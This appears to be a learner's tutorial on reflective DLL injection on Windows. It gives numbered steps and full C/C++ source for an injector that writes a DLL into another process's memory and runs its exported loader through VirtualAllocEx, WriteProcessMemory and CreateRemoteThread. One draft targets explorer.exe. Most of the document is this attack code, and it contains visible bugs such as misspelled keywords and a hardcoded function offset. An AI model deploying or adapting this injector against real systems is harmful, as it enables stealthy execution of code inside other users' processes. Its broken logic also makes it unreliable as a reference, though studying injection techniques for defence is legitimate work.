# Reflective Injection

**Reflective injection is a technique that allows an attacker to  inject a DLL into a target process from memory rather than disk.** 

## Overview
Here we will have 2 processes:
- Target process(host process)
- Injector process
- and a DLL.
Inside a DLL there will be a exported function. Name of the exported function will be **ReflectiveLoader** or it can be whatever we want. 

In brief; injector process will write the dll in the address space of target process and then it will call the exported function(ReflectiveLoader) of the DLL. Then the exported function will load itself in the target address space.

## Steps to make injector process:
1. Take command line arguments
	- pid of target process **argv[1]**
	- absolute path of the dll to be injected **argv[2]**
	- name of the exported function of dll that will load the itself(dll) **argv[3]**
2. Using the *absolute path of DLL* open the dll with required access right and read it in heap memory of injector process
3. traverse the dll file copied into heap to find out the offset of the exported function(argv[3]).
4. save the offset of exported function in a variable. **If not able to find the offset then free the allocated heap memory and exit the program**.
5. else  
6. Using the *pid* open the target process with the required access rights
8. Using WIN API *VirtualAllocEx()* allocate a READ_WRITE_EXECUTABLE region in the target process.
9. using WIN API *WriteProcessMemory()* write the memory allocated in previous step with the dll present in the heap of injector process
10. VirtualAllocEx() function will save the first address of allocated memory space in a variable. After previous step that first address will be the base address of the dll.
11. adding up the base address of dll and the offset of exported function we will get the virtual address of exported function
12. This VA of exported function will be given to WIN API CreateRemoteThread() as the functionality to be executed the the thread.
  	
        
		DWORD ThreadId;
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)VAOfExportedFunction, NULL, (DWORD)NULL, &dwThreadId);
        	if (!hThread) {
        		printf("Error in creating thread");
        		return 1;
    		}
	    	WaitForSingleObject(hThread, -1);	

13.with this the injecter code will be completed

## code

    /*#include <stdio.h>
    #include <Windows.h>
    #include <string.h>
    
    typedef struct _PE_INFO {
      LPVOID base;
      BOOL Reloc; //If base relocation is needed
      LPVOID Get_Proc; //Address of GetProcAddress function 
      LPVOID Load_Dll; //Address of LoadLibraryA
    }PE_INFO, * LPE_INFO;
    
    
    // This function gives us the data of Target Process using which we will read its headers
    DWORD ReadTargetProcessMemory(char * ProcessName) {
        HANDLE hProcess;
        DWORD fileSize;
        LPVOID fileData = NULL;
        DWORD byteRead = NULL
        
        hProcess = CreateFileA(ProcessName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	    if (file == INVALID_HANDLE_VALUE) {
            printf("Could not read file");
        }
        
        fileSize = GetFileSize(hProcess, NULL);
	    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
        if (!fileData) {
            printf("Failed to allocate heap memory");
        }
        
        ReadFile(hProcess, fileData, fileSize, &bytesRead, NULL);
        
        return fileData;
    }
    
    
    // This function will find the pid of the target process. Name of the target process will be given by command line argument
    HANDLE FindProcess(const char* processName) {
      HANDLE hSnapshot, hProcess; 
      PROCESSENTRY32 pe;
      pe.dwSize = sizeof(pe);
      BOOL found = 0;
      
      if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
        return 1;
      }
    
      if(!Process32First(hSnapshot, &pe)) {
        return 1;
      }
      
      do {
        if (!strcmp(pe.szExeFile , processName)) {
          found = 1;
          break;
        }
      } while (Process32Next(hSnapshot, &pe));
      
      if (!found) {
        printf("Processnot found\n");
        retrun 1;
      }
      
      if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pe.th32ProcessID)) == NULL) {    //take a look we are asing foe all access.
                                                                                          //This can give error for someother process
        printf("Failed to open process\n");
        return 1;
      }
      
      else 
      retrun hProcess;
    }
    
    
    int main(int argc, char* argv[]) {
   
      if (argc != 2){
        printf("usage: <DLL path>");
      }
      
      HANDLE hProcess;
      DWORD base;
      PIMAGE_DOS_HEADER dos;
      PIMAGE_NT_HEADERS nt;  
      PIMAGE_SECTION_HEADER sec;
      
      base = ReadTargetProcessMemory(argv[1]);
      if (!base) {
        printf("Failed to read file");
        retrun 1;
      }
      
      dos = (PIMAGE_DOS_HEADER)base;
      if (dos->e_magic != 23117) {
        printf("Invalid file");
        retrun 1;
      }
      
      nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
      sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt +24 + nt->FileHeader.SizeOfOptionalHeader);
      
      if (nt->OptionalHeader.Magic != 523) {
        printf("This is not a 64-bit PE file");
        retrun 1;
      }
      
      hProcess = FindProcess("explorer.exe");
      if (!hProcess) {
        printf("Failed to open process");
        retrun 1;
      }
      
      //6:27
      
    return 0;
    }*/
    // ReflectiveInjector.cpp : This file contains the 'main' function. Program execution begins and ends there.
	//

    /*So here we can see that we are traversing the PE file. We know that we need 
    to traverse the PE file for development of a shellcode. The method or idea to
    traverse a PE file is different for  both  shellcode  and  DLLInjection. When
    traversing a PE file for shellcode development we can see the file we are 
    traversing(generally kernel32.dll) is inside the memory. This means we can get
    Virtual addresses of function quit easily by adding "RVA +Base address of DLL".
    The case is not same with DLL injection. In this case the PE file is on disk 
    and not in memory. So, here RVA won't work. We need of offset.
    And this is how we can get offset  

    // function do what its name says
    DWORD RVAtoOffset(DWORD RVA,PIMAGE_SECTION_HEADER section, PIMAGE_NT_HEADERS dllNtHeaders, PIMAGE_DOS_HEADER dllbaseAddress){
    //DWORD RVA --> RVA of the "thing" whose offset we want
    //PIMAGE_SECTION_HEADER section --> VA of first section
    //PIMAGE_NT_HEADERS dllNtHeaders --> address of NT header
    //PIMAGE_DOS_HEADER dllbaseAddress --> base address of DLL 
    DWORD offset = 0;
    for (int i = 0; i <= dllNtHeaders->FileHeader.NumberOfSections; i++) {
        //dllsection = section;
        //printf("pointer to raw data of %s section header is : %p\n", dllsection->Name, dllsection->PointerToRawData);
        if ((RVA > section->VirtualAddress) && (RVA < section->VirtualAddress + section->Misc.VirtualSize)) {
            printf("The given RVA is found in %s section having virtual address: %p\n", section->Name, section->VirtualAddress);
            offset = DWORD(section->PointerToRawData + (RVA - section->VirtualAddress));
            printf("Offset to given %x RVA is %x\n", RVA, offset);
            return offset;
            
        }
        section = section + 1;
    }
    
    return RVA;
    }
     */


	#include <iostream>
	#include <stdio.h>
	#include "Windows.h"
	#include <string.h>

	// function do what its name says
	DWORD RVAtoOffset(DWORD RVA,PIMAGE_SECTION_HEADER section, PIMAGE_NT_HEADERS dllNtHeaders, PIMAGE_DOS_HEADER dllbaseAddress){
    		DWORD offset = 0;
        	for (int i = 0; i <= dllNtHeaders->FileHeader.NumberOfSections; i++) {
        		//dllsection = section;
        		//printf("pointer to raw data of %s section header is : %p\n", dllsection->Name, dllsection->PointerToRawData);
        		if ((RVA > section->VirtualAddress) && (RVA < section->VirtualAddress + section->Misc.VirtualSize)) {
            			printf("The given RVA is found in %s section having virtual address: %p\n", section->Name, section->VirtualAddress);
            			offset = DWORD(section->PointerToRawData + (RVA - section->VirtualAddress));
            			printf("Offset to given %x RVA is %x\n", RVA, offset);
            			return offset;
            
       			}
       			section = section + 1;
   	 	}
    
    	return RVA;
	}


	int main(int argc, char* argv[])
	{
   
    DWORD pid;
    HANDLE hProcess;
    const char* FunctionName = 0;
    HANDLE hDllfile;
    DWORD DllFileSize;
    LPVOID BaseinjectedDll;
    DWORD bytesread;
    LPVOID heapaddress;
    char* dllpath = 0;
    //printf("press enter\n");
    //getchar();
    if (argc == 3) {
        pid = GetCurrentProcessId();
        printf("Dll will be injected into pid: %d", pid);
        dllpath = argv[1];
        FunctionName = argv[2];
    }

    if (argc == 4) {
        //printf("Usage: <pid> <dllpath> <functionName>");
        //return 1;
        pid = atoi(argv[1]);
        dllpath = argv[2];
        FunctionName = argv[3];
    }

   
   

    //gives handle of target process
    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, false, pid);
    if (!hProcess) {
        printf("Failed to open process");
        return 1;
    }

    //gives handle of DLL
    hDllfile = CreateFileA(dllpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hDllfile) {
        printf("Failed to open Dll file\n");
        return 1;
    }

    //get the dll file size
    DllFileSize = GetFileSize(hDllfile, NULL);
    if (DllFileSize == INVALID_FILE_SIZE || DllFileSize == 0) {
        printf("Failed to get DLL file size\n");
        return 1;
    }

    // allocate heap where to read Dll file
    heapaddress = HeapAlloc(GetProcessHeap(), 0, DllFileSize);
    if (!heapaddress) {
        printf("Failed to get heap in current process");
        return 1;
    }

    // read the Dll file into allocated heap of current process
    ReadFile(hDllfile, heapaddress, DllFileSize, &bytesread, NULL);
    if ((bytesread == 0) || (bytesread != DllFileSize)) {
        printf("Failed to read Dll file in allocated heap\n");
        printf("error number : %d", GetLastError());
        return 1;
    }



    UINT_PTR dllbaseAddress = (UINT_PTR)heapaddress;
    UINT_PTR addressofname;
    PIMAGE_DOS_HEADER dllDosHeader;
    PIMAGE_NT_HEADERS dllNtHeaders;
    PIMAGE_DATA_DIRECTORY dllDataDirectory;
    PIMAGE_EXPORT_DIRECTORY dllexportDirectory;
    PVOID reflectiveloader = NULL;
    DWORD RVAexportDirectory;
    WORD ordinalNumber = 0;

    dllDosHeader = (PIMAGE_DOS_HEADER)dllbaseAddress;
    printf("base address: %p\n", dllbaseAddress);

    dllNtHeaders = (PIMAGE_NT_HEADERS)(dllbaseAddress + (dllDosHeader->e_lfanew));

    if (dllNtHeaders->OptionalHeader.Magic == 0x020B) {
        printf("This is PE64\n");
    }
    
    if (dllNtHeaders->OptionalHeader.Magic == 0x010B) {
        printf("This is PE32\n");
    }
    
    
    //Section header
    PIMAGE_SECTION_HEADER section, dllsection = NULL;

    //RVA of export directory
    RVAexportDirectory = ((DWORD)(dllNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
    printf("RVA of export directory: %p\n", RVAexportDirectory);

    //VA of first section
    section = IMAGE_FIRST_SECTION(dllNtHeaders);
    /*#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((ULONG_PTR)(ntheader) +                                            \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))*/
    
    //Travesing section to find where our export directory is
    for (int i = 0; i <= dllNtHeaders->FileHeader.NumberOfSections; i++) {
        dllsection = section;
        //printf("pointer to raw data of %s section header is : %p\n", dllsection->Name, dllsection->PointerToRawData);
        if ((RVAexportDirectory > dllsection->VirtualAddress) && (RVAexportDirectory < dllsection->VirtualAddress + dllsection->Misc.VirtualSize)) {
            printf("export directory is found in %s section having virtual address: %p\n", dllsection->Name, dllsection->VirtualAddress);
            break;
        }
        section = section + 1;
    }

    section = IMAGE_FIRST_SECTION(dllNtHeaders); // just for a while
    printf("pointer to raw data of %s section header is : %p\n", section->Name, section->PointerToRawData);
    //dllexportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllbaseAddress + dllsection->PointerToRawData + (RVAexportDirectory - dllsection->VirtualAddress));
    dllexportDirectory = (PIMAGE_EXPORT_DIRECTORY)( dllbaseAddress + RVAtoOffset(RVAexportDirectory, section, dllNtHeaders, dllDosHeader));
    printf("address of of export directory: %p\n", dllexportDirectory);
    printf("charecterstic of exported function: %x\n", (dllexportDirectory->Characteristics));
    printf("number of function: %d\n", (dllexportDirectory->NumberOfFunctions));
    printf("RVA of address of address name table: %p\n", (dllexportDirectory->AddressOfNames));  //RVA of address of name array 
    printf("RVA of address of address name ordinal: %p\n", (dllexportDirectory->AddressOfNameOrdinals));  //RVA of name ordinal array
    printf("RVA of address of address name table: %p\n", (dllexportDirectory->AddressOfFunctions));  //RVA of function address array
    /*---------------------------------------------------------------------------------------*/

   
    //calculated offset of address of name array from RVA  
    //DWORD OffsetOfNameArray = (DWORD)(dllsection->PointerToRawData + dllexportDirectory->AddressOfNames - dllsection->VirtualAddress);
    DWORD OffsetOfNameArray = RVAtoOffset(dllexportDirectory->AddressOfNames, section, dllNtHeaders, dllDosHeader);
    printf("offset of array having function name: %p\n", OffsetOfNameArray);
    //calculating offset of name ordinal form RVA
    //DWORD OffsetOfNameOrdinal = (DWORD)(dllsection->PointerToRawData + dllexportDirectory->AddressOfNameOrdinals - dllsection->VirtualAddress);
    DWORD OffsetOfNameOrdinal = RVAtoOffset(dllexportDirectory->AddressOfNameOrdinals, section, dllNtHeaders, dllDosHeader);
    printf("offset of array having name ordinal: %p\n", OffsetOfNameOrdinal);

    DWORD OffsetOfFunctionArray ;//= (DWORD)(dllsection->PointerToRawData + dllexportDirectory->AddressOfFunctions - dllsection->VirtualAddress);
    OffsetOfFunctionArray = RVAtoOffset(dllexportDirectory->AddressOfFunctions, section, dllNtHeaders, dllDosHeader);
    printf("offset of array having RVA to function address: %p\n", OffsetOfFunctionArray);

    /*---------------------------------------------------------------------------------------------------------------------------*/
    //VA of array which will store RVA of function name
    DWORD* AddressOfNameArray = (DWORD*)(dllbaseAddress + OffsetOfNameArray);
    printf("VA of array having function name calculated from dllbaseaddress: %p\n", AddressOfNameArray);
    //found the RVA of function name from the array of function name

    /*---------------------------------------------------------------------------------------------------------------------------*/
    DWORD* AddressOfNameOrdinalArray = (DWORD*)(dllbaseAddress + OffsetOfNameOrdinal); // VA of array having name ordinal




    for (int i = 0; i < dllexportDirectory->NumberOfFunctions; i++) {
        /*--------------------------------------------------------------*/
        printf("RVA of function name: %p\n", AddressOfNameArray[i]);
        //converting RVA to offset
        DWORD OffsetOfFunctionName; //= (DWORD)(dllsection->PointerToRawData + AddressOfNameArray[i] - dllsection->VirtualAddress);
        OffsetOfFunctionName = RVAtoOffset(AddressOfNameArray[i], section, dllNtHeaders, dllDosHeader);
        printf("offset of function name: %p\n", OffsetOfFunctionName);
        char* VAofFunctionName = (char*)(dllbaseAddress + OffsetOfFunctionName + i*sizeof(DWORD));
        printf("VA of function name: %p\n", VAofFunctionName);
        /*--------------------------------------------------------------*/
        ordinalNumber = *(AddressOfNameOrdinalArray + i*sizeof(WORD));
        printf("name ordinal : %p\n", ordinalNumber);
        /*--------------------------------------------------------------*/
        printf("Function name outside if condition: %s\n", VAofFunctionName);
        /*if (!strcmp(VAofFunctionName, FunctionName)) {
            printf("function found\n");
            printf("Function name: %s\n", VAofFunctionName);
            break;
        } */ // better to use strstr()
        if (strstr(VAofFunctionName, FunctionName) != NULL) {
            printf("function found\n");
            printf("Function name: %s\n", VAofFunctionName);
            break;
        }
    }

    /*---------------------------------------------------------------------------------------------------------------------------*/
    //VA of function array having RVA to function
    DWORD* AddressOfFunctionArray = (DWORD*)(dllbaseAddress + OffsetOfFunctionArray);
    printf("VA of array having RVA of function : %p\n", AddressOfFunctionArray);
    //getting RVA of function
    printf("RVA of function address : %p\n", AddressOfFunctionArray[ordinalNumber]);
    //getting offset of function
    //DWORD OffsetOfFunction = (DWORD)((DWORD)dllsection->PointerToRawData + (DWORD)AddressOfFunctionArray[ordinalNumber] - (DWORD)dllsection->VirtualAddress);
    DWORD OffsetOfFunction = RVAtoOffset(AddressOfFunctionArray[ordinalNumber], section, dllNtHeaders, dllDosHeader);
    printf("offset of function %s : %p\n", FunctionName, OffsetOfFunction); // actually what we need is offset
    OffsetOfFunction = 0x44C;
    printf("offset of function %s : %p\n", FunctionName, OffsetOfFunction); // actually what we need is offset
    DWORD* AddressOfFunction = (DWORD*)(dllbaseAddress + OffsetOfFunction);
    printf("VA of function %s : %p\n", FunctionName, AddressOfFunctionArray);
    /*---------------------------------------------------------------------------------------------------------------------------*/
    //OffsetOfFunction = 0x44C;

        // Allocate memory(size of dll to be injected) in address space of target process
    BaseinjectedDll = VirtualAllocEx(hProcess, NULL, DllFileSize/*1 << 12*/, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!BaseinjectedDll) {
        printf("failed to get memory in target process\n");
        return 1;
    }

    //write the process address space with the Dll in the heap of current process
    if (!WriteProcessMemory(hProcess, BaseinjectedDll, heapaddress, DllFileSize, NULL)) {
        printf("Failed to write in target address space\n");
        printf("error number : %d", GetLastError());
        return 1;
    }

    printf("Starting address of injected DLL in address space of target memory: %p\n", BaseinjectedDll);

    LPTHREAD_START_ROUTINE addressOfReflectiveLoader = (LPTHREAD_START_ROUTINE)((UINT_PTR)BaseinjectedDll + OffsetOfFunction);
    printf("VA of function in target address space: %p\n", addressOfReflectiveLoader);
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, addressOfReflectiveLoader, NULL, (DWORD)NULL, &dwThreadId);
    if (!hThread) {
        printf("Error in creating thread");
        return 1;
    }


    WaitForSingleObject(hThread, -1);

    if (heapaddress)
        HeapFree(GetProcessHeap(), 0, heapaddress);

    if (hProcess)
        CloseHandle(hProcess);


    printf("success!\n");
    
    return 0;
   }



    
    
